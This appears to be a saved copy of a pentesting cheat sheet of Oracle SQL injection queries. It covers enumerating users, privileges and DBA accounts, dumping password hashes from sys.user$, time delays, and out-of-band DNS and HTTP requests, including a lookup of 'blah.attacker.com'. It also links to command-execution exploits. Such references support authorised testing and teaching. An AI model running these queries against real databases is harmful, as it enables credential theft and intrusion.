http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet

<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;<br>
SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;<br>
SELECT version FROM v$instance;</td>
</tr>
<tr>
<td>Comments</td>
<td>SELECT 1 FROM dual — comment<br>
– NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name ‘dual’ when we’re not actually selecting from a table.</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT user FROM dual</td>
</tr>
<tr>
<td>List Users</td>
<td>SELECT username FROM all_users ORDER BY username;<br>
SELECT name FROM sys.user$; — priv</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>SELECT name, password, astatus FROM sys.user$ — priv, &lt;= 10g.&nbsp; astatus tells you if acct is locked<br>
SELECT name,spare4 FROM sys.user$ — priv, 11g</td>
</tr>
<tr>
<td>&nbsp;Password Cracker</td>
<td><a href="http://www.red-database-security.com/software/checkpwd.html">checkpwd</a> will crack the DES-based hashes from Oracle 8, 9 and 10.</td>
</tr>
<tr>
<td>List Privileges</td>
<td>SELECT * FROM session_privs; — current privs<br>
SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, list a user’s privs<br>
SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, find users with a particular priv<br>
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, list DBAs, DBA roles</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT global_name FROM global_name;<br>
SELECT name FROM v$database;<br>
SELECT instance_name FROM v$instance;<br>
SELECT SYS.DATABASE_NAME FROM DUAL;</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT DISTINCT owner FROM all_tables; — list schemas (one per user)<br>
– Also query TNS listener for other databases.&nbsp; See <a href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a> (services | status).</td>
</tr>
<tr>
<td>List Columns</td>
<td>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;<br>
SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;</td>
</tr>
<tr>
<td>List Tables</td>
<td>SELECT table_name FROM all_tables;<br>
SELECT owner, table_name FROM all_tables;</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’; — NB: table names are upper case</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — gets 9th row (rows numbered from 1)</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT substr(‘abcd’, 3, 1) FROM dual; — gets 3rd character, ‘c’</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>SELECT bitand(6,2) FROM dual; — returns 2<br>
SELECT bitand(6,1) FROM dual; — returns0</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>SELECT chr(65) FROM dual; — returns A</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>SELECT ascii(‘A’) FROM dual; — returns 65</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT CAST(1 AS char) FROM dual;<br>
SELECT CAST(’1′ AS int) FROM dual;</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT ‘A’ || ‘B’ FROM dual; — returns AB</td>
</tr>
<tr>
<td>If Statement</td>
<td>BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; — doesn’t play well with SELECT statements</td>
</tr>
<tr>
<td>Case Statement</td>
<td>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — returns 1<br>
SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — returns 2</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>SELECT chr(65) || chr(66) FROM dual; — returns AB</td>
</tr>
<tr>
<td>Time Delay</td>
<td>BEGIN DBMS_LOCK.SLEEP(5); END; — priv, can’t seem to embed this in a SELECT<br>
SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — if reverse looks are slow<br>
SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — if forward lookups are slow<br>
SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — if outbound TCP is filtered / slow<br>
– Also see <a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a> to create a time delay</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;<br>
SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;</td>
</tr>
<tr>
<td>Command Execution</td>
<td><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a>can be used to execute commands if it’s installed.<a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">ExtProc</a> can sometimes be used too, though it normally failed for me. <img src="http://pentestmonkey.net/wp-includes/images/smilies/icon_sad.gif" alt=":-(" class="wp-smiley"> </td>
</tr>
<tr>
<td>Local File Access</td>
<td><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a> can sometimes be used.&nbsp; Check that the following is non-null:<br>
SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a> can be used to read and write files if it’s installed (it is not available in Oracle Express).</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT UTL_INADDR.get_host_name FROM dual;<br>
SELECT host_name FROM v$instance;<br>
SELECT UTL_INADDR.get_host_address FROM dual; — gets IP address<br>
SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — gets hostnames</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>SELECT name FROM V$DATAFILE;</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>SYSTEM<br>
SYSAUX</td>
</tr>
</tbody>
</table>

My Cheats
<table border="1">
<tbody>
<tr>
<td>List all tables and rows</td>
<td>
select TABLE_NAME, NUM_ROWS from all_tables  where OWNER like 'ORC';
</td>
<tr>
</tbody>
</table>